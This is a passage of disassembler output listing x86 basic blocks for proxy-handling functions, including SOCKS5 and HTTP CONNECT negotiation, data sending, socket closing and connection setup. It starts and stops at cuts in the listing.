0x804e1ff:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e263:	mov	byte ptr [edx + ebx + 9], 0
0x804e268:	push	0
0x804e26a:	push	dword ptr [ebp - 0xb0]
0x804e270:	push	edx
0x804e271:	push	dword ptr [ebp + 8]
0x804e274:	call	0x804bfe0
None
|
|
|
v
0x804e2ac:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e2a5:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e304:	add	esp, 0x10
0x804e307:	cmp	eax, 8
0x804e30a:	jne	0x804e317
None
|
|
|
v
0x804e30c:	cmp	byte ptr [ebp - 0x27], 0x5a
0x804e310:	sete	byte ptr [ebp - 0xa9]
0x804e317:	mov	al, byte ptr [ebp - 0xa9]
0x804e31d:	lea	esp, dword ptr [ebp - 0xc]
0x804e320:	pop	ebx
0x804e321:	pop	esi
0x804e322:	pop	edi
0x804e323:	pop	ebp
0x804e324:	ret	
None
|
|
|
v
0x804e2a7:	mov	edi, edx
0x804e2a9:	mov	cl, 0x20
0x804e2ab:	cld	
0x804e2ac:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e257:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e2d9:	add	esp, 0x20
0x804e2dc:	test	eax, eax
0x804e2de:	jle	0x804e317
None
|
|
|
v
0x804e317:	mov	al, byte ptr [ebp - 0xa9]
0x804e31d:	lea	esp, dword ptr [ebp - 0xc]
0x804e320:	pop	ebx
0x804e321:	pop	esi
0x804e322:	pop	edi
0x804e323:	pop	ebp
0x804e324:	ret	
None
|
|
|
v
0x804e21f:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x804e2ae:	mov	ebx, dword ptr [ebp + 8]
0x804e2b1:	mov	eax, 1
0x804e2b6:	sub	esp, 0xc
0x804e2b9:	mov	cl, byte ptr [ebp + 8]
0x804e2bc:	push	0
0x804e2be:	push	0
0x804e2c0:	shr	ebx, 5
0x804e2c3:	shl	eax, cl
0x804e2c5:	or	dword ptr [ebp + ebx*4 - 0xa8], eax
0x804e2cc:	mov	eax, dword ptr [ebp + 8]
0x804e2cf:	push	0
0x804e2d1:	push	edx
0x804e2d2:	inc	eax
0x804e2d3:	push	eax
0x804e2d4:	call	0x804bc00
None
|
|
|
v
0x804e1e9:	push	ebp
0x804e1ea:	xor	eax, eax
0x804e1ec:	mov	ebp, esp
0x804e1ee:	push	edi
0x804e1ef:	push	esi
0x804e1f0:	or	esi, 0xffffffff
0x804e1f3:	push	ebx
0x804e1f4:	mov	ecx, esi
0x804e1f6:	sub	esp, 0xac
0x804e1fc:	mov	edi, dword ptr [ebp + 0xc]
0x804e1ff:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e2f7:	push	0
0x804e2f9:	push	8
0x804e2fb:	push	esi
0x804e2fc:	push	dword ptr [ebp + 8]
0x804e2ff:	call	0x804bfa0
None
|
|
|
v
0x804e279:	add	esp, 0x10
0x804e27c:	mov	byte ptr [ebp - 0xa9], 0
0x804e283:	cmp	eax, dword ptr [ebp - 0xb0]
0x804e289:	jne	0x804e317
None
|
|
|
v
0x804e201:	mov	ebx, ecx
0x804e203:	not	ebx
0x804e205:	lea	edx, dword ptr [ebx + 0x27]
0x804e208:	and	edx, 0xfffffff0
0x804e20b:	sub	esp, edx
0x804e20d:	lea	edx, dword ptr [esp + 0xf]
0x804e211:	and	edx, 0xfffffff0
0x804e214:	lea	ecx, dword ptr [ebx + 9]
0x804e217:	mov	edi, edx
0x804e219:	mov	dword ptr [ebp - 0xb0], ecx
0x804e21f:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x804e2e0:	mov	eax, dword ptr [ebp + 8]
0x804e2e3:	mov	ecx, 0x20
0x804e2e8:	cdq	
0x804e2e9:	idiv	ecx
0x804e2eb:	mov	eax, dword ptr [ebp + eax*4 - 0xa8]
0x804e2f2:	bt	eax, edx
0x804e2f5:	jae	0x804e317
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:HandleSocks5
TOTAL BLOCKS :34
0x804e450:	cmp	byte ptr [ebp - 0x19], 0
0x804e454:	jne	0x804e45b
None
|
|
|
v
0x804e40b:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804e430:	add	esp, 0x10
0x804e433:	cmp	eax, dword ptr [ebp - 0x3c]
0x804e436:	jne	0x804e45b
None
|
|
|
v
0x804e465:	mov	edi, dword ptr [ebp + 0xc]
0x804e468:	xor	eax, eax
0x804e46a:	or	ecx, 0xffffffff
0x804e46d:	mov	esi, dword ptr [ebp + 0xc]
0x804e470:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e3a1:	cmp	al, 2
0x804e3a3:	jne	0x804e465
None
|
|
|
v
0x804e3bf:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e4f3:	cmp	byte ptr [ebx], 5
0x804e4f6:	mov	eax, 1
0x804e4fb:	je	0x804e506
None
|
|
|
v
0x804e36a:	mov	word ptr [ebp - 0x1a], 0
0x804e370:	lea	edx, dword ptr [ebp - 0x1a]
0x804e373:	push	0
0x804e375:	push	2
0x804e377:	push	edx
0x804e378:	push	dword ptr [ebp + 8]
0x804e37b:	call	0x804bfa0
None
|
|
|
v
0x804e40d:	mov	al, byte ptr [ebp - 0x38]
0x804e410:	mov	esi, dword ptr [ebp + 0x18]
0x804e413:	mov	ecx, dword ptr [ebp - 0x30]
0x804e416:	mov	byte ptr [edx + ebx + 2], al
0x804e41a:	lea	eax, dword ptr [edx + ebx + 3]
0x804e41e:	mov	edi, eax
0x804e420:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804e4d6:	sub	esp, dword ptr [ebp - 0x2c]
0x804e4d9:	lea	ebx, dword ptr [esp + 0xf]
0x804e4dd:	push	0
0x804e4df:	and	ebx, 0xfffffff0
0x804e4e2:	push	eax
0x804e4e3:	push	ebx
0x804e4e4:	push	dword ptr [ebp + 8]
0x804e4e7:	call	0x804bfa0
None
|
|
|
v
0x804e4ec:	add	esp, 0x10
0x804e4ef:	test	eax, eax
0x804e4f1:	js	0x804e508
None
|
|
|
v
0x804e508:	lea	esp, dword ptr [ebp - 0xc]
0x804e50b:	mov	eax, esi
0x804e50d:	pop	ebx
0x804e50e:	pop	esi
0x804e50f:	pop	edi
0x804e510:	pop	ebp
0x804e511:	ret	
None
|
|
|
v
0x804e456:	mov	esp, dword ptr [ebp - 0x40]
0x804e459:	jmp	0x804e465
None
|
|
|
v
0x804e420:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804e448:	add	esp, 0x10
0x804e44b:	cmp	eax, 2
0x804e44e:	jne	0x804e45b
None
|
|
|
v
0x804e38c:	cmp	byte ptr [ebp - 0x1a], 5
0x804e390:	jne	0x804e508
None
|
|
|
v
0x804e4ce:	add	esp, 0x10
0x804e4d1:	cmp	eax, dword ptr [ebp - 0x30]
0x804e4d4:	jne	0x804e508
None
|
|
|
v
0x804e4ac:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804e438:	push	0
0x804e43a:	push	2
0x804e43c:	lea	edx, dword ptr [ebp - 0x1a]
0x804e43f:	push	edx
0x804e440:	push	dword ptr [ebp + 8]
0x804e443:	call	0x804bfa0
None
|
|
|
v
0x804e3d2:	mov	edx, ecx
0x804e3d4:	not	edx
0x804e3d6:	dec	edx
0x804e3d7:	movzx	ecx, dl
0x804e3da:	mov	eax, ecx
0x804e3dc:	add	eax, ebx
0x804e3de:	mov	dword ptr [ebp - 0x38], edx
0x804e3e1:	lea	edx, dword ptr [eax + 3]
0x804e3e4:	add	eax, 0x21
0x804e3e7:	and	eax, 0x3f0
0x804e3ec:	mov	dword ptr [ebp - 0x30], ecx
0x804e3ef:	sub	esp, eax
0x804e3f1:	mov	cl, byte ptr [ebp - 0x34]
0x804e3f4:	mov	dword ptr [ebp - 0x3c], edx
0x804e3f7:	lea	edx, dword ptr [esp + 0xf]
0x804e3fb:	and	edx, 0xfffffff0
0x804e3fe:	lea	eax, dword ptr [edx + 2]
0x804e401:	mov	byte ptr [edx + 1], cl
0x804e404:	mov	edi, eax
0x804e406:	mov	ecx, ebx
0x804e408:	mov	byte ptr [edx], 1
0x804e40b:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804e3d0:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e325:	push	ebp
0x804e326:	mov	ebp, esp
0x804e328:	push	edi
0x804e329:	push	esi
0x804e32a:	push	ebx
0x804e32b:	sub	esp, 0x3c
0x804e32e:	mov	eax, dword ptr [ebp + 0x14]
0x804e331:	mov	byte ptr [ebp - 0x20], 5
0x804e335:	mov	byte ptr [ebp - 0x1f], 1
0x804e339:	cmp	byte ptr [eax], 1
0x804e33c:	sbb	eax, eax
0x804e33e:	xor	esi, esi
0x804e340:	not	eax
0x804e342:	and	eax, 2
0x804e345:	mov	byte ptr [ebp - 0x1e], al
0x804e348:	lea	eax, dword ptr [ebp - 0x20]
0x804e34b:	push	0
0x804e34d:	push	3
0x804e34f:	push	eax
0x804e350:	push	dword ptr [ebp + 8]
0x804e353:	call	0x804bfe0
None
|
|
|
v
0x804e472:	not	ecx
0x804e474:	dec	ecx
0x804e475:	movzx	ebx, cl
0x804e478:	lea	edx, dword ptr [ebx + 7]
0x804e47b:	mov	dword ptr [ebp - 0x30], edx
0x804e47e:	lea	edx, dword ptr [ebx + 0x25]
0x804e481:	and	edx, 0x1f0
0x804e487:	sub	esp, edx
0x804e489:	mov	dword ptr [ebp - 0x2c], edx
0x804e48c:	lea	edx, dword ptr [esp + 0xf]
0x804e490:	and	edx, 0xfffffff0
0x804e493:	lea	eax, dword ptr [edx + 5]
0x804e496:	mov	byte ptr [edx + 4], cl
0x804e499:	mov	edi, eax
0x804e49b:	mov	ecx, ebx
0x804e49d:	mov	byte ptr [edx], 5
0x804e4a0:	mov	byte ptr [edx + 1], 1
0x804e4a4:	mov	byte ptr [edx + 2], 0
0x804e4a8:	mov	byte ptr [edx + 3], 3
0x804e4ac:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804e396:	mov	al, byte ptr [ebp - 0x19]
0x804e399:	cmp	al, 0xff
0x804e39b:	je	0x804e508
None
|
|
|
v
0x804e506:	mov	esi, eax
0x804e508:	lea	esp, dword ptr [ebp - 0xc]
0x804e50b:	mov	eax, esi
0x804e50d:	pop	ebx
0x804e50e:	pop	esi
0x804e50f:	pop	edi
0x804e510:	pop	ebp
0x804e511:	ret	
None
|
|
|
v
0x804e3a9:	mov	edi, dword ptr [ebp + 0x14]
0x804e3ac:	or	edx, 0xffffffff
0x804e3af:	mov	eax, esi
0x804e3b1:	mov	dword ptr [ebp - 0x40], esp
0x804e3b4:	mov	ecx, edx
0x804e3b6:	mov	esi, dword ptr [ebp + 0x14]
0x804e3b9:	mov	word ptr [ebp - 0x1a], 0
0x804e3bf:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e380:	add	esp, 0x10
0x804e383:	cmp	eax, 2
0x804e386:	jne	0x804e508
None
|
|
|
v
0x804e45b:	xor	esi, esi
0x804e45d:	mov	esp, dword ptr [ebp - 0x40]
0x804e460:	jmp	0x804e508
None
|
|
|
v
0x804e358:	movzx	edx, byte ptr [ebp - 0x1f]
0x804e35c:	add	esp, 0x10
0x804e35f:	add	edx, 2
0x804e362:	cmp	eax, edx
0x804e364:	jne	0x804e508
None
|
|
|
v
0x804e470:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e4fd:	xor	eax, eax
0x804e4ff:	cmp	byte ptr [ebx + 1], 0
0x804e503:	sete	al
0x804e506:	mov	esi, eax
0x804e508:	lea	esp, dword ptr [ebp - 0xc]
0x804e50b:	mov	eax, esi
0x804e50d:	pop	ebx
0x804e50e:	pop	esi
0x804e50f:	pop	edi
0x804e510:	pop	ebp
0x804e511:	ret	
None
|
|
|
v
0x804e3c1:	mov	edi, dword ptr [ebp + 0x18]
0x804e3c4:	not	ecx
0x804e3c6:	dec	ecx
0x804e3c7:	mov	dword ptr [ebp - 0x34], ecx
0x804e3ca:	mov	ecx, edx
0x804e3cc:	movzx	ebx, byte ptr [ebp - 0x34]
0x804e3d0:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e422:	push	0
0x804e424:	push	dword ptr [ebp - 0x3c]
0x804e427:	push	edx
0x804e428:	push	dword ptr [ebp + 8]
0x804e42b:	call	0x804bfe0
None
|
|
|
v
0x804e4ae:	xor	esi, esi
0x804e4b0:	mov	eax, dword ptr [ebp + 0x10]
0x804e4b3:	ror	ax, 8
0x804e4b7:	mov	word ptr [ebp - 0x1c], ax
0x804e4bb:	mov	word ptr [edx + ebx + 5], ax
0x804e4c0:	push	0
0x804e4c2:	push	dword ptr [ebp - 0x30]
0x804e4c5:	push	edx
0x804e4c6:	push	dword ptr [ebp + 8]
0x804e4c9:	call	0x804bfe0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:HandleHTTPConnect
TOTAL BLOCKS :10
0x804e55d:	add	esp, 0x10
0x804e560:	cmp	eax, edi
0x804e562:	jne	0x804e59b
None
|
|
|
v
0x804e56d:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e584:	push	eax
0x804e585:	push	ebx
0x804e586:	push	0x8056089
0x804e58b:	push	0
0x804e58d:	call	0x8051d7f
None
|
|
|
v
0x804e59b:	add	esp, 0x80c
0x804e5a1:	mov	eax, ebp
0x804e5a3:	pop	ebx
0x804e5a4:	pop	esi
0x804e5a5:	pop	edi
0x804e5a6:	pop	ebp
0x804e5a7:	ret	
None
|
|
|
v
0x804e57d:	add	esp, 0x10
0x804e580:	test	eax, eax
0x804e582:	jle	0x804e59b
None
|
|
|
v
0x804e54e:	add	esp, 0x20
0x804e551:	push	0
0x804e553:	push	eax
0x804e554:	mov	edi, eax
0x804e556:	push	ebx
0x804e557:	push	esi
0x804e558:	call	0x804bfe0
None
|
|
|
v
0x804e512:	push	ebp
0x804e513:	xor	ebp, ebp
0x804e515:	push	edi
0x804e516:	push	esi
0x804e517:	push	ebx
0x804e518:	sub	esp, 0x810
0x804e51e:	mov	esi, dword ptr [esp + 0x824]
0x804e525:	push	dword ptr [esp + 0x82c]
0x804e52c:	push	dword ptr [esp + 0x82c]
0x804e533:	push	0x8056070
0x804e538:	push	0x800
0x804e53d:	push	1
0x804e53f:	push	0x800
0x804e544:	lea	ebx, dword ptr [esp + 0x1c]
0x804e548:	push	ebx
0x804e549:	call	0x804bb70
None
|
|
|
v
0x804e56f:	push	0
0x804e571:	push	0x800
0x804e576:	push	ebx
0x804e577:	push	esi
0x804e578:	call	0x804bfa0
None
|
|
|
v
0x804e592:	add	esp, 0x10
0x804e595:	inc	eax
0x804e596:	setne	al
0x804e599:	mov	ebp, eax
0x804e59b:	add	esp, 0x80c
0x804e5a1:	mov	eax, ebp
0x804e5a3:	pop	ebx
0x804e5a4:	pop	esi
0x804e5a5:	pop	edi
0x804e5a6:	pop	ebp
0x804e5a7:	ret	
None
|
|
|
v
0x804e564:	xor	eax, eax
0x804e566:	mov	ecx, 0x200
0x804e56b:	mov	edi, ebx
0x804e56d:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:HandleProxy
TOTAL BLOCKS :12
0x804e626:	pop	edx
0x804e627:	pop	ebx
0x804e628:	pop	esi
0x804e629:	ret	
None
|
|
|
v
0x804e5f8:	sub	esp, 0xc
0x804e5fb:	lea	esi, dword ptr [ebx + 0x68]
0x804e5fe:	add	ebx, 0x48
0x804e601:	push	esi
0x804e602:	push	ebx
0x804e603:	push	ecx
0x804e604:	push	edx
0x804e605:	push	eax
0x804e606:	call	0x804e325
None
|
|
|
v
0x804e5ce:	jmp	0x804e610
None
|
|
|
v
0x804e624:	mov	al, 1
0x804e626:	pop	edx
0x804e627:	pop	ebx
0x804e628:	pop	esi
0x804e629:	ret	
None
|
|
|
v
0x804e60b:	add	esp, 0x20
0x804e60e:	jmp	0x804e626
None
|
|
|
v
0x804e5c4:	cmp	esi, 2
0x804e5c7:	je	0x804e5f8
None
|
|
|
v
0x804e5c2:	jb	0x804e5d0
None
|
|
|
v
0x804e610:	mov	dword ptr [esp + 0x18], ecx
0x804e614:	mov	dword ptr [esp + 0x14], edx
0x804e618:	mov	dword ptr [esp + 0x10], eax
0x804e61c:	pop	ecx
0x804e61d:	pop	ebx
0x804e61e:	pop	esi
0x804e61f:	jmp	0x804e512
None
|
|
|
v
0x804e5d0:	mov	dword ptr [esp + 0x18], ecx
0x804e5d4:	mov	dword ptr [esp + 0x14], edx
0x804e5d8:	mov	dword ptr [esp + 0x10], eax
0x804e5dc:	pop	esi
0x804e5dd:	pop	ebx
0x804e5de:	pop	esi
0x804e5df:	jmp	0x804e0c9
None
|
|
|
v
0x804e5c9:	cmp	esi, 3
0x804e5cc:	jne	0x804e624
None
|
|
|
v
0x804e5e4:	mov	dword ptr [esp + 0x18], ecx
0x804e5e8:	mov	dword ptr [esp + 0x14], edx
0x804e5ec:	mov	dword ptr [esp + 0x10], eax
0x804e5f0:	pop	ebx
0x804e5f1:	pop	ebx
0x804e5f2:	pop	esi
0x804e5f3:	jmp	0x804e1e9
None
|
|
|
v
0x804e5a8:	push	esi
0x804e5a9:	push	ebx
0x804e5aa:	push	eax
0x804e5ab:	mov	ebx, dword ptr [esp + 0x14]
0x804e5af:	mov	eax, dword ptr [esp + 0x10]
0x804e5b3:	mov	edx, dword ptr [esp + 0x18]
0x804e5b7:	mov	ecx, dword ptr [esp + 0x1c]
0x804e5bb:	mov	esi, dword ptr [ebx]
0x804e5bd:	cmp	esi, 1
0x804e5c0:	je	0x804e5e4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:SendData
TOTAL BLOCKS :32
0x804e7c6:	mov	eax, dword ptr [esp + 0x1c]
0x804e7ca:	mov	edx, dword ptr [esp + 0x18]
0x804e7ce:	test	dword ptr [esp + eax*4 + 0x28], edx
0x804e7d2:	je	0x804e7f5
None
|
|
|
v
0x804e645:	add	esp, 0x10
0x804e648:	test	ebx, ebx
0x804e64a:	jne	0x804e659
None
|
|
|
v
0x804e7bf:	add	esp, 0x20
0x804e7c2:	test	eax, eax
0x804e7c4:	jle	0x804e803
None
|
|
|
v
0x804e810:	add	esp, 0x10
0x804e813:	or	eax, 0xffffffff
0x804e816:	inc	esi
0x804e817:	je	0x804e81c
None
|
|
|
v
0x804e7eb:	add	esp, 0x10
0x804e7ee:	cmp	eax, 0xff
0x804e7f1:	mov	esi, eax
0x804e7f3:	je	0x804e803
None
|
|
|
v
0x804e707:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804e659:	cmp	dword ptr [esp + 0xdc], -1
0x804e661:	jne	0x804e676
None
|
|
|
v
0x804e7d4:	mov	eax, dword ptr [0x805b9ec]
0x804e7d9:	push	0
0x804e7db:	push	ebx
0x804e7dc:	add	eax, ebp
0x804e7de:	push	eax
0x804e7df:	push	dword ptr [esp + 0xdc]
0x804e7e6:	call	0x804bfe0
None
|
|
|
v
0x804e66c:	not	ecx
0x804e66e:	dec	ecx
0x804e66f:	mov	dword ptr [esp + 0xdc], ecx
0x804e676:	mov	eax, dword ptr [esp + 0xdc]
0x804e67d:	add	eax, 5
0x804e680:	cmp	eax, dword ptr [0x805b9e8]
0x804e686:	mov	dword ptr [esp + 0xc], eax
0x804e68a:	jbe	0x804e6c0
None
|
|
|
v
0x804e676:	mov	eax, dword ptr [esp + 0xdc]
0x804e67d:	add	eax, 5
0x804e680:	cmp	eax, dword ptr [0x805b9e8]
0x804e686:	mov	dword ptr [esp + 0xc], eax
0x804e68a:	jbe	0x804e6c0
None
|
|
|
v
0x804e663:	xor	eax, eax
0x804e665:	or	ecx, 0xffffffff
0x804e668:	mov	edi, ebx
0x804e66a:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e68c:	sub	esp, 0xc
0x804e68f:	or	esi, 0xffffffff
0x804e692:	push	dword ptr [0x805b9ec]
0x804e698:	call	0x804bbc0
None
|
|
|
v
0x804e6cb:	mov	eax, dword ptr [esp + 0xd0]
0x804e6d2:	cmp	eax, dword ptr [0x8058724]
0x804e6d8:	mov	eax, dword ptr [0x805b9ec]
0x804e6dd:	jne	0x804e6fe
None
|
|
|
v
0x804e66a:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x804e7f9:	cmp	ebp, dword ptr [esp + 0xc]
0x804e7fd:	jb	0x804e76d
None
|
|
|
v
0x804e803:	sub	esp, 0xc
0x804e806:	push	0x805b9d0
0x804e80b:	call	0x804bb60
None
|
|
|
v
0x804e76d:	mov	ecx, 0x20
0x804e772:	xor	eax, eax
0x804e774:	lea	edi, dword ptr [esp + 0x28]
0x804e778:	cld	
0x804e779:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e6df:	push	edx
0x804e6e0:	add	eax, 5
0x804e6e3:	push	edx
0x804e6e4:	push	eax
0x804e6e5:	push	ebx
0x804e6e6:	push	0x805c290
0x804e6eb:	push	ebp
0x804e6ec:	push	1
0x804e6ee:	push	dword ptr [0x805c28c]
0x804e6f4:	call	0x80547a2
None
|
|
|
v
0x804e6fe:	add	eax, 5
0x804e701:	mov	esi, ebx
0x804e703:	mov	edi, eax
0x804e705:	mov	ecx, ebp
0x804e707:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x804e62a:	push	ebp
0x804e62b:	push	edi
0x804e62c:	push	esi
0x804e62d:	push	ebx
0x804e62e:	sub	esp, 0xc8
0x804e634:	mov	ebx, dword ptr [esp + 0xe4]
0x804e63b:	push	0x805b9d0
0x804e640:	call	0x804bc70
None
|
|
|
v
0x804e779:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x804e6a7:	add	esp, 0x10
0x804e6aa:	test	eax, eax
0x804e6ac:	mov	dword ptr [0x805b9ec], eax
0x804e6b1:	je	0x804e803
None
|
|
|
v
0x804e7f5:	add	ebp, esi
0x804e7f7:	sub	ebx, esi
0x804e7f9:	cmp	ebp, dword ptr [esp + 0xc]
0x804e7fd:	jb	0x804e76d
None
|
|
|
v
0x804e81c:	add	esp, 0xbc
0x804e822:	pop	ebx
0x804e823:	pop	esi
0x804e824:	pop	edi
0x804e825:	pop	ebp
0x804e826:	ret	
None
|
|
|
v
0x804e64c:	mov	dword ptr [esp + 0xdc], 0
0x804e657:	jmp	0x804e676
None
|
|
|
v
0x804e6f9:	add	esp, 0x20
0x804e6fc:	jmp	0x804e709
None
|
|
|
v
0x804e69d:	pop	ecx
0x804e69e:	push	dword ptr [esp + 0x18]
0x804e6a2:	call	0x804bd40
None
|
|
|
v
0x804e6b7:	mov	eax, dword ptr [esp + 0xc]
0x804e6bb:	mov	dword ptr [0x805b9e8], eax
0x804e6c0:	mov	ebp, dword ptr [esp + 0xdc]
0x804e6c7:	test	ebp, ebp
0x804e6c9:	jle	0x804e709
None
|
|
|
v
0x804e6c0:	mov	ebp, dword ptr [esp + 0xdc]
0x804e6c7:	test	ebp, ebp
0x804e6c9:	jle	0x804e709
None
|
|
|
v
0x804e77b:	mov	eax, dword ptr [esp + 0x10]
0x804e77f:	mov	edx, dword ptr [esp + 0x14]
0x804e783:	mov	dword ptr [esp + 0xa8], 0xa
0x804e78e:	mov	dword ptr [esp + 0xac], 0
0x804e799:	or	dword ptr [esp + eax*4 + 0x28], edx
0x804e79d:	sub	esp, 0xc
0x804e7a0:	lea	ecx, dword ptr [esp + 0xb4]
0x804e7a7:	push	ecx
0x804e7a8:	push	0
0x804e7aa:	lea	eax, dword ptr [esp + 0x3c]
0x804e7ae:	push	eax
0x804e7af:	push	0
0x804e7b1:	mov	eax, dword ptr [esp + 0xec]
0x804e7b8:	inc	eax
0x804e7b9:	push	eax
0x804e7ba:	call	0x804bc00
None
|
|
|
v
0x804e709:	mov	eax, dword ptr [0x805b9ec]
0x804e70e:	inc	ebp
0x804e70f:	mov	ebx, 1
0x804e714:	mov	dword ptr [esp + 0xdc], ebp
0x804e71b:	mov	esi, 0x20
0x804e720:	mov	dword ptr [eax], ebp
0x804e722:	mov	edx, dword ptr [esp + 0xd4]
0x804e729:	xor	ebp, ebp
0x804e72b:	mov	cl, byte ptr [esp + 0xd0]
0x804e732:	mov	byte ptr [eax + 4], dl
0x804e735:	mov	eax, ebx
0x804e737:	mov	edx, dword ptr [esp + 0xd0]
0x804e73e:	shl	eax, cl
0x804e740:	mov	dword ptr [esp + 0x14], eax
0x804e744:	mov	eax, dword ptr [esp + 0xd0]
0x804e74b:	shr	edx, 5
0x804e74e:	mov	dword ptr [esp + 0x10], edx
0x804e752:	cdq	
0x804e753:	idiv	esi
0x804e755:	or	esi, 0xffffffff
0x804e758:	mov	cl, dl
0x804e75a:	shl	ebx, cl
0x804e75c:	mov	dword ptr [esp + 0x18], ebx
0x804e760:	mov	ebx, dword ptr [esp + 0xc]
0x804e764:	mov	dword ptr [esp + 0x1c], eax
0x804e768:	jmp	0x804e7f9
None
|
|
|
v
0x804e819:	lea	eax, dword ptr [ebp - 5]
0x804e81c:	add	esp, 0xbc
0x804e822:	pop	ebx
0x804e823:	pop	esi
0x804e824:	pop	edi
0x804e825:	pop	ebp
0x804e826:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CloseSocket
TOTAL BLOCKS :7
0x804e839:	push	edx
0x804e83a:	push	edx
0x804e83b:	push	2
0x804e83d:	push	eax
0x804e83e:	call	0x804bf70
None
|
|
|
v
0x804e84e:	mov	dword ptr [ebx], 0xffffffff
0x804e854:	add	esp, 8
0x804e857:	pop	ebx
0x804e858:	ret	
None
|
|
|
v
0x804e833:	mov	eax, dword ptr [ebx]
0x804e835:	test	eax, eax
0x804e837:	js	0x804e84e
None
|
|
|
v
0x804e827:	push	ebx
0x804e828:	sub	esp, 8
0x804e82b:	mov	ebx, dword ptr [esp + 0x10]
0x804e82f:	test	ebx, ebx
0x804e831:	je	0x804e854
None
|
|
|
v
0x804e843:	pop	ecx
0x804e844:	push	dword ptr [ebx]
0x804e846:	call	0x804bfb0
None
|
|
|
v
0x804e84b:	add	esp, 0x10
0x804e84e:	mov	dword ptr [ebx], 0xffffffff
0x804e854:	add	esp, 8
0x804e857:	pop	ebx
0x804e858:	ret	
None
|
|
|
v
0x804e854:	add	esp, 8
0x804e857:	pop	ebx
0x804e858:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:EstablishConnection
TOTAL BLOCKS :53
0x804e89a:	push	edx
0x804e89b:	push	edi
0x804e89c:	push	dword ptr [eax + 0x44]
0x804e89f:	add	eax, 4
0x804e8a2:	push	eax
0x804e8a3:	call	0x804e020
None
|
|
|
v
0x804ea15:	lea	edi, dword ptr [esp + 0xc]
0x804ea19:	lea	ebp, dword ptr [esp + 0x1c]
0x804ea1d:	mov	eax, dword ptr [0x805b9c4]
0x804ea22:	test	eax, eax
0x804ea24:	jne	0x804e9a3
None
|
|
|
v
0x804e925:	sub	esp, 0xc
0x804e928:	or	ebx, 0xffffffff
0x804e92b:	lea	eax, dword ptr [esp + 0x28]
0x804e92f:	push	eax
0x804e930:	call	0x804e827
None
|
|
|
v
0x804ea6c:	sub	esp, 0xc
0x804ea6f:	lea	eax, dword ptr [esp + 0x28]
0x804ea73:	push	eax
0x804ea74:	call	0x804e827
None
|
|
|
v
0x804e8bf:	mov	dword ptr [esp + 0x2c], eax
0x804e8c3:	add	esp, 0xc
0x804e8c6:	push	0x10
0x804e8c8:	push	edi
0x804e8c9:	push	eax
0x804e8ca:	call	0x804bf80
None
|
|
|
v
0x804e9c4:	mov	dword ptr [esp + 0x2c], eax
0x804e9c8:	add	esp, 0xc
0x804e9cb:	push	0x10
0x804e9cd:	push	edi
0x804e9ce:	push	eax
0x804e9cf:	call	0x804bf80
None
|
|
|
v
0x804e8b3:	push	ecx
0x804e8b4:	push	0
0x804e8b6:	push	1
0x804e8b8:	push	2
0x804e8ba:	call	0x804bf10
None
|
|
|
v
0x804ea1d:	mov	eax, dword ptr [0x805b9c4]
0x804ea22:	test	eax, eax
0x804ea24:	jne	0x804e9a3
None
|
|
|
v
0x804e9b8:	push	eax
0x804e9b9:	push	0
0x804e9bb:	push	1
0x804e9bd:	push	2
0x804e9bf:	call	0x804bf10
None
|
|
|
v
0x804e95b:	sub	esp, 0xc
0x804e95e:	push	ebp
0x804e95f:	call	0x804e827
None
|
|
|
v
0x804e859:	push	ebp
0x804e85a:	push	edi
0x804e85b:	push	esi
0x804e85c:	push	ebx
0x804e85d:	sub	esp, 0x2c
0x804e860:	mov	ebx, dword ptr [esp + 0x40]
0x804e864:	mov	esi, dword ptr [esp + 0x44]
0x804e868:	mov	dword ptr [esp + 0x1c], 0xffffffff
0x804e870:	call	0x80530cc
None
|
|
|
v
0x804ea2a:	jmp	0x804ea7e
None
|
|
|
v
0x804e998:	cmp	eax, 2
0x804e99b:	jne	0x804ea2c
None
|
|
|
v
0x804ea43:	push	ebp
0x804ea44:	push	0
0x804ea46:	push	1
0x804ea48:	push	2
0x804ea4a:	call	0x804bf10
None
|
|
|
v
0x804e912:	push	esi
0x804e913:	push	ebx
0x804e914:	push	eax
0x804e915:	push	dword ptr [esp + 0x28]
0x804e919:	call	0x804e5a8
None
|
|
|
v
0x804e98e:	jmp	0x804ea7e
None
|
|
|
v
0x804ea7e:	mov	ebx, dword ptr [esp + 0x1c]
0x804ea82:	add	esp, 0x2c
